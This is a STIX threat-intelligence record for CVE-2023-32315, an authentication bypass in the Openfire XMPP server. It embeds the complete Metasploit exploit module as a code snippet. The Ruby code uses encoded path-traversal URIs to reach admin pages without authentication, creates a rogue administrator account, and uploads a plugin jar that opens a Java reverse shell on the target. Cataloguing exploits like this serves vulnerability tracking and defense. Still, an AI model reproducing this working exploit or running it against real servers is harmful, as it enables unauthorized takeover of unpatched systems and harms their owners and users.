{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3889eb89-b771-48a9-b17d-0ca998996e93",
    "created": "2024-08-14T17:08:52.565655Z",
    "modified": "2024-08-14T17:08:52.565659Z",
    "name": "Openfire authentication bypass with RCE plugin",
    "description": " Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin weaponised with java native payload that triggers an RCE. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the first version on the 4.8 branch, which is version 4.8.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/openfire_auth_bypass_rce_cve_2023_32315.rb",
            "external_id": "openfire_auth_bypass_rce_cve_2023_32315.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-32315"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/miko550/CVE-2023-32315"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Openfire authentication bypass with RCE plugin',\n        'Description' => %q{\n          Openfire is an XMPP server licensed under the Open Source Apache License.\n          Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack\n          via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment\n          in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for\n          administrative users.\n          This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin\n          weaponised with java native payload that triggers an RCE.\n          This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0.\n          The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the\n          first version on the 4.8 branch, which is version 4.8.0.\n        },\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-32315'],\n          ['URL', 'https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315'],\n          ['URL', 'https://github.com/miko550/CVE-2023-32315'],\n          ['URL', 'https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'java' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_JAVA ],\n        'Targets' => [\n          [\n            'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'java/shell/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-05-26',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 9090\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),\n        OptString.new('PLUGINNAME', [ false, 'Openfire plugin base name, (default: random)' ]),\n        OptString.new('PLUGINAUTHOR', [ false, 'Openfire plugin author, (default: random)' ]),\n        OptString.new('PLUGINDESC', [ false, 'Openfire plugin description, (default: random)' ]),\n        OptString.new('ADMINNAME', [ false, 'Openfire admin user name, (default: random)' ]),\n      ]\n    )\n  end\n\n  def get_version\n    # get Openfire version number from the admin console login page\n    openfire_version = nil\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded'\n    })\n    if res && res.code == 200\n      version = res.body.match(/Openfire,\\s*\\D*:\\s*\\d\\.\\d{1,2}\\.\\d/)\n      openfire_version = Rex::Version.new(version[0].split(':')[1].strip) unless version.nil?\n    end\n\n    openfire_version\n  end\n\n  def auth_bypass\n    # bypass authentication using path traversal vulnerability and return true if cookie_jar is filled (JSESSION-ID and CSRF) else return false.\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-groups.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true\n    })\n    return false if cookie_jar.cookies.empty?\n\n    cookie_jar.cookies.each do |cookie|\n      print_status(cookie.to_s)\n    end\n    return true\n  end\n\n  def add_admin_user\n    # add an admin user using path traversal vulnerability using the cookies retrieved from authentication bypass.\n    # returns admin login hash with random generated username and password\n    @admin_login = {}\n    username = datastore['ADMINNAME'] || Rex::Text.rand_text_alpha_lower(8..15)\n    password = Rex::Text.rand_password(8..10)\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-create.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'vars_get' => {\n        'csrf' => @csrf_token.to_s,\n        'username' => username.to_s,\n        'password' => password.to_s,\n        'passwordConfirm' => password.to_s,\n        'isadmin' => 'on',\n        'create' => 'Create+User'\n      }\n    })\n    # path traversal throws a java exception error 500 and/or returns a 200 OK code not matter if the user is added or not,\n    # so we have to check during the login of the new admin user if we have been successful here\n    if res && res.code == 200 || res.code == 500\n      @admin_login['username'] = username\n      @admin_login['password'] = password\n    end\n    return @admin_login\n  end\n\n  def login_admin_user\n    # login using admin hash with admin username and password\n    # returns true if login successful else returns false\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'url' => '%2Findex.jsp',\n        'login' => 'true',\n        'csrf' => @csrf_token.to_s,\n        'username' => @admin_login['username'].to_s,\n        'password' => @admin_login['password'].to_s\n      }\n    })\n    if res && res.code == 200 && res.body.match(/login box/).nil?\n      store_valid_credential(user: @admin_login['username'], private: @admin_login['password'], proof: cookie_jar.cookies)\n      return true\n    else\n      return false\n    end\n  end\n\n  def prepare_plugin_jar\n    # prepares the plugin foundation that will host the payload\n    files = [\n      [ 'logo_large.gif' ],\n      [ 'logo_small.gif' ],\n      [ 'readme.html' ],\n      [ 'changelog.html' ],\n      [ 'lib', 'plugin-metasploit.jar' ]\n    ]\n\n    jar = Rex::Zip::Jar.new\n    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))\n\n    @plugin_name = datastore['PLUGINNAME'] || Rex::Text.rand_text_alphanumeric(8..15)\n    plugin_author = datastore['PLUGINAUTHOR'] || Rex::Text.rand_text_alphanumeric(8..15)\n    plugin_desc = datastore['PLUGINDESC'] || Rex::Text.rand_text_alphanumeric(8..15)\n\n    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))\n    plugin_xml.gsub!(/PLUGINNAME/, @plugin_name)\n    plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)\n    plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)\n\n    jar.add_file('plugin.xml', plugin_xml)\n    return jar\n  end\n\n  def upload_and_execute_plugin(plugin_jar)\n    # upload and execute Openfire plugin with encoded payload\n    # returns true if upload is successful else returns false\n\n    # construct multipart form data\n    form_data = Rex::MIME::Message.new\n    form_data.add_part(plugin_jar.to_s, 'application/x-java-archive', 'binary', \"form-data; name=\\\"uploadfile\\\"; filename=\\\"#{@plugin_name}.jar\\\"\")\n\n    # extract the csrf token\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),\n      'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n      'keep_cookies' => true,\n      'data' => form_data.to_s,\n      'vars_get' => {\n        'uploadplugin' => nil,\n        'csrf' => @csrf_token.to_s\n      }\n    })\n    # with a successfull upload and execution of the plugin, no response is returned.\n    return true unless res\n    # safety check if, for whatever reason, we get a 302 response back\n    if res.code == 302 && res.headers.to_s.match(/uploadsuccess=true/)\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n    openfire_version = get_version\n    return CheckCode::Safe if openfire_version.nil?\n    # check first for patched versions\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.6.8')\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.7.5')\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.8.0')\n\n    if openfire_version < Rex::Version.new('4.8.0') && openfire_version >= Rex::Version.new('3.10.0')\n      CheckCode::Appears(\"Openfire version is #{openfire_version}\")\n    else\n      CheckCode::Safe(\"Openfire version is #{openfire_version}\")\n    end\n  end\n\n  def exploit\n    # gain access exploiting path traversal vulnerability\n    print_status('Grabbing the cookies.')\n    fail_with(Failure::NoAccess, 'Authentication bypass is not successful.') unless auth_bypass\n\n    # add a new admin user\n    print_status('Adding a new admin user.')\n    fail_with(Failure::NoAccess, 'Adding a new admin user is not successful.') if add_admin_user.empty?\n\n    # login with new admin account\n    print_status(\"Logging in with admin user \\\"#{@admin_login['username']}\\\" and password \\\"#{@admin_login['password']}\\\".\")\n    fail_with(Failure::NoAccess, 'Login is not successful.') unless login_admin_user\n\n    # prepare Openfire plugin with payload\n    plugin = prepare_plugin_jar\n    plugin.add_file(\"lib/#{rand_text_alphanumeric(8)}.jar\", payload.encoded_jar.pack)\n    plugin.build_manifest\n\n    # upload and execute Openfire plugin with payload\n    print_status(\"Upload and execute plugin \\\"#{@plugin_name}\\\" with payload \\\"#{datastore['PAYLOAD']}\\\".\")\n    fail_with(Failure::PayloadFailed, 'Upload and/or execution of the plugin is not successful.') unless upload_and_execute_plugin(plugin.pack)\n\n    # cover our tracks!!!\n    # remove plugin and newly added admin user\n    # Automatic removal of plugin and admin user might cause instability in the application,\n    # so remove it manually in Openfire Management console after the exploit is completed.\n    print_warning(\"Plugin \\\"#{@plugin_name}\\\" need manually clean-up via Openfire Admin console.\")\n    print_warning(\"Admin user \\\"#{@admin_login['username']}\\\" need manually clean-up via Openfire Admin console.\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-26",
    "x_mitre_platforms": [
        "java'"
    ]
}